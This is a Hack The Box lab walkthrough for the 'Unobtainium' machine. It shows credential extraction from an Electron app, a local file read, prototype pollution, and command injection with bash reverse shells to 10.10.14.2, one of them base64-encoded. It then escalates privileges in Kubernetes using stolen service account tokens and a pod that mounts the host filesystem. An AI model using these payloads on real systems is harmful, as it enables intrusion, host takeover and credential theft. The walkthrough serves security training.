## Unobtainium

https://app.hackthebox.com/machines/Unobtainium

### User Flag

Port Enumeration
```
80/tcp    open  http          syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Unobtainium
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)

8443/tcp  open  ssl/https-alt syn-ack
| ssl-cert: Subject: commonName=k3s/organizationName=k3s
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster.local, DNS:localhost, DNS:unobtainium, IP Address:10.10.10.235, IP Address:10.129.136.226, IP Address:10.43.0.1, IP Address:127.0.0.1

10250/tcp open  ssl/http      syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)

10251/tcp open  unknown       syn-ack

31337/tcp open  http          syn-ack Node.js Express framework
```

Download unobtainium on the HTTP port.

It is made with electron. Extract files from `app.asar`.
```
npx @electron/asar extract /opt/unobtainium/resources/app.asar app.js/
```

We have credentials inside src/js/todo.js.
```
data: JSON.stringify({"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "todo.txt"})
```

Analyzing this file, we can curl as it is.
```
curl -s http://unobtainium.htb:31337/todo -H "Content-Type: application/json" -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "todo.txt"}' | jq
```

We can perform LFI, but just on local folder. Since we known it's NodeJS/Express framework, we try a few guesses like `server.js` and `main.js`, and eventually we got `index.js`.
```
curl -s http://unobtainium.htb:31337/todo -H "Content-Type: application/json" -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename" : "index.js"}' | jq -r '.content' > index.js
```

We could brute force this with:
```
ffuf -u http://10.10.10.235:31337/todo -d '{"auth":{"name":"felamos","password":"Winter2021"},"filename":"FUZZ.js"}' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -H 'Content-Type: application/json'
```

We save the content to index.js to analyze it.
```js
app.post('/upload', (req, res) => {
  const user = findUser(req.body.auth || {});
  if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }


  filename = req.body.filename;
  root.upload("./",filename, true);
  res.send({ok: true, Uploaded_File: filename});
});
```

First, this route is authenticated and only user that has 'canUpload' can access it. Felamos user doesn't has access and we don't have the password for admin, since it is random.

<br>

#### Prototype Pollution

The PUT / is vulnerable here:
```js
app.put('/', (req, res) => {
  const user = findUser(req.body.auth || {});

  if (!user) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  const message = {
    icon: '__',
  };

  _.merge(message, req.body.message, {
    id: lastId++,
    timestamp: Date.now(),
    userName: user.name,
  });

  messages.push(message);
  res.send({ok: true});
});
```

It is running `merge` on `message` and `req.body.message`. Looking at `app.js`, we remember the PUT has a body of:
```js
data: JSON.stringify({"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"text": message}})
```

So we can perform prototype pollution with:
```
{
  "auth": {
    "name": "felamos", 
    "password": "Winter2021"
  }, 
  "message": {
    "test": "something",
    "__proto__": {
        "canUpload": true
    }
  }
}
```

Curl a request with this body and now we can access `upload` route.
```bash
curl -X PUT  http://10.10.10.235:31337/ -H 'Content-Type: application/json' -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"test": "something", "__proto__": {"canUpload": true}}}'
{"ok":true}

curl -X POST http://10.10.10.235:31337/upload -H 'Content-Type: application/json' -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "test"}'
{"ok":true,"Uploaded_File":"test"}
```

<br>

#### Command Injection

Getting back to upload route:
```js
filename = req.body.filename;
root.upload("./",filename, true);
res.send({ok: true, Uploaded_File: filename});
```

`root` is the imported `google-cloudstorage-commands` module.

Looking at it [GitHub](https://www.npmjs.com/package/google-cloudstorage-commands), the command used is in `index.js`.
```js
const exec = require('child_process').exec
const path = require('path')
const P = (() => {

    const BASE_URL = 'https://storage.googleapis.com/'

    function upload(inputDirectory, bucket, force = false) {
        return new Promise((yes, no) => {
            let _path = path.resolve(inputDirectory)
            let _rn = force ? '-r' : '-Rn'
            let _cmd = exec(`gsutil -m cp ${_rn} -a public-read ${_path} ${bucket}`)
            _cmd.on('exit', (code) => {
                yes()
            })
        })
    }
```

It is just setting variables, and then calling `exec` on `gsutil`. This immediately looks vulnerable to command injection.

We can inject with this payload:
```bash
curl -X POST http://10.10.10.235:31337/upload -H 'content-type: application/json' -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "x; ping -c 1 10.10.14.2"}'
{"ok":true,"Uploaded_File":"x; ping -c 1 10.10.14.2"}


curl -X POST http://10.10.10.235:31337/upload -H 'Content-Type: application/json' -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "x; bash -c \"bash >& /dev/tcp/10.10.14.2/1337 0>&1\""}'
```

IppSec Reverse
```
echo 'bash -i >& /dev/tcp/10.10.14.2/1337 0>&1' | base64 -w 0

"filename": "; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzEzMzcgMD4mMQo= | base64 -d | bash"}
```

### Privilege Escalation

Port 8443 indicate us that we are on a kubernet.

We can use [peirates](https://github.com/inguardians/peirates) or kubectl to enumerate k8s.

We can list namespaces according to kubectl.
```
# Showing what we can list
./kubectl auth can-i --list
```

We can get the k8 token in `/run/secrets/kubernetes.io/serviceaccount/token`.

Enumerating with kubectl.
```
./kubectl get namespaces

./kubectl auth can-i --list -n dev

./kubectl get pods -n dev

./kubectl describe pod devnode-deployment-776dbcf7d6-7gjgf -n dev
10.42.0.66:3000

./kubectl describe pod devnode-deployment-776dbcf7d6-sr6vj -n dev
10.42.0.64:3000

./kubectl describe pod devnode-deployment-776dbcf7d6-g4659 -n dev
10.42.0.71:3000
```

We enumerate that dev is running at 172.17.0.5:3000 and it seems to be the same application, so we can repeat the shell process.
```
curl -X PUT  http://10.42.0.66:3000/ -H 'Content-Type: application/json' -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"test": "something", "__proto__": {"canUpload": true}}}'

curl -X POST http://10.42.0.66:3000/upload -H 'Content-Type: application/json' -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "x; bash -c \"bash >& /dev/tcp/10.10.14.2/3333 0>&1\""}'
```

```
# Listing other things
./kubectl auth can-i --list -n kube-system
secrets

./kubectl get secrets -n kube-system

# List another token
./kubectl describe secrets c-admin-token-b47f7 -n kube-system

echo 'eyJhbGciOiJSUzI1NiIsImtpZCI6InRqSFZ0OThnZENVcDh4SXltTGhfU0hEX3A2UXBhMG03X2pxUVYtMHlrY2cifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLWI0N2Y3Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIzMTc3OGQxNy05MDhkLTRlYzMtOTA1OC0xZTUyMzE4MGIxNGMiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.fka_UUceIJAo3xmFl8RXncWEsZC3WUROw5x6dmgQh_81eam1xyxq_ilIz6Cj6H7v5BjcgIiwsWU9u13veY6dFErOsf1I10nADqZD66VQ24I6TLqFasTpnRHG_ezWK8UuXrZcHBu4Hrih4LAa2rpORm8xRAuNVEmibYNGhj_PNeZ6EWQJw7n87lir2lYcqGEY11kXBRSilRU1gNhWbnKoKReG_OThiS5cCo2ds8KDX6BZwxEpfW4A7fKC-SdLYQq6_i2EzkVoBg8Vk2MlcGhN-0_uerr6rPbSi9faQNoKOZBYYfVHGGM3QDCAk3Du-YtByloBCfTw8XylG9EuTgtgZA' > token

./kubectl --token=$(cat /tmp/token) auth can-i create pods -n kube-system

./kubectl --token=$(cat /tmp/token) get pods

./kubectl --token=$(cat /tmp/token) get pod devnode-deployment-776dbcf7d6-7gjgf -o yaml
```

Create static pod.
```yaml
apiVersion: v1 
kind: Pod
metadata:
  name: alpine
  namespace: kube-system
spec:
  containers:
  - name: evil0xdf
    image: localhost:5000/dev-alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 300000"]
    volumeMounts: 
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:  
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Execute it.
```
./kubectl --token=$(cat /tmp/token) apply -f pod.yaml

./kubectl exec alpine --stdin --tty -n kube-system --token=$(cat /tmp/token) -- /bin/sh
```
